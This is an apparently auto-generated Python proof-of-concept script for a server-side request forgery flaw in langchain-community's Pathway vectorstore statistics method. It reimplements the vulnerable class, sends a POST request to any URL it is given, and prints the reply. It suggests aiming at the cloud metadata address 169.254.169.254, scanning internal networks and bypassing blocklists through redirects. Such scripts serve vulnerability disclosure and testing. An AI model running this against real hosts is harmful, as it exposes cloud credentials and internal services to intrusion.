#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: ssrf-005
# Sink: get_vectorstore_statistics
# Auto-generated — run with: python3 ssrf_url_concatenating_self_get_vectorstore_statistics_5.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF in langchain-community-only

Vulnerability: The get_vectorstore_statistics method in the Pathway vectorstore
class constructs a URL by concatenating self.url with '/v1/statistics' and makes
a POST request. The self.url attribute is set during initialization and can be
attacker-controlled. There is no validation, allowlist, or sanitization.

Impact: An attacker can make the server send requests to internal IPs, cloud
metadata endpoints, or other internal services. The response is returned to the
caller, enabling reflective SSRF.

Usage:
    python3 poc_ssrf.py [target_url]

    If no target_url is provided, defaults to http://127.0.0.1:8080 (local test).
    For cloud metadata testing, use:
        python3 poc_ssrf.py http://169.254.169.254/latest/meta-data/
"""

import sys
import requests
import json

# Default target - change to test different endpoints
DEFAULT_TARGET = "http://127.0.0.1:8080"


class PathwayVectorstore:
    """
    Simplified reproduction of the vulnerable class from langchain-community.
    The actual class is in langchain_community/vectorstores/pathway.py
    """

    def __init__(self, url: str):
        """
        Initialize with a URL. This URL is attacker-controlled in the vulnerable
        scenario.
        """
        self.url = url.rstrip("/")  # Remove trailing slash for consistency

    def get_vectorstore_statistics(self):
        """
        Vulnerable method: constructs URL by concatenating self.url with
        '/v1/statistics' and makes a POST request. No validation is performed.
        """
        url = self.url + "/v1/statistics"
        print(f"[*] Making POST request to: {url}")

        try:
            response = requests.post(
                url,
                json={},
                headers={"Content-Type": "application/json"},
                timeout=10,  # Prevent hanging
                allow_redirects=True,  # Follows redirects by default (SSRF bypass)
            )
            print(f"[*] Response status: {response.status_code}")
            print(f"[*] Response headers: {dict(response.headers)}")
            print(f"[*] Response body: {response.text[:500]}")  # Truncate long responses

            # Try to parse as JSON if possible
            try:
                data = response.json()
                print(f"[*] Parsed JSON: {json.dumps(data, indent=2)[:1000]}")
            except json.JSONDecodeError:
                print("[*] Response is not valid JSON (showing raw text above)")

            return response

        except requests.exceptions.ConnectionError as e:
            print(f"[!] Connection error: {e}")
            print("[!] Target may be unreachable or refusing connections")
        except requests.exceptions.Timeout as e:
            print(f"[!] Timeout: {e}")
            print("[!] Target did not respond within 10 seconds")
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {e}")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")

        return None


def main():
    # Get target URL from command line or use default
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET

    print(f"[*] SSRF PoC for langchain-community-only")
    print(f"[*] Target URL: {target}")
    print(f"[*] The vulnerable code will append '/v1/statistics' to this URL")
    print()

    # Create the vulnerable object with attacker-controlled URL
    store = PathwayVectorstore(target)

    # Trigger the SSRF
    print("[*] Triggering SSRF via get_vectorstore_statistics()...")
    result = store.get_vectorstore_statistics()

    if result:
        print("\n[*] SSRF completed successfully!")
        print("[*] The response above shows what the internal service returned.")
    else:
        print("\n[!] SSRF failed - see error messages above.")

    print()
    print("[*] Note: In a real attack, an attacker could:")
    print("  - Scan internal networks (e.g., http://192.168.1.1:8080)")
    print("  - Access cloud metadata endpoints (e.g., http://169.254.169.254/)")
    print("  - Reach internal services (databases, caches, etc.)")
    print("  - Use redirects to bypass simple blocklists")


if __name__ == "__main__":
    main()
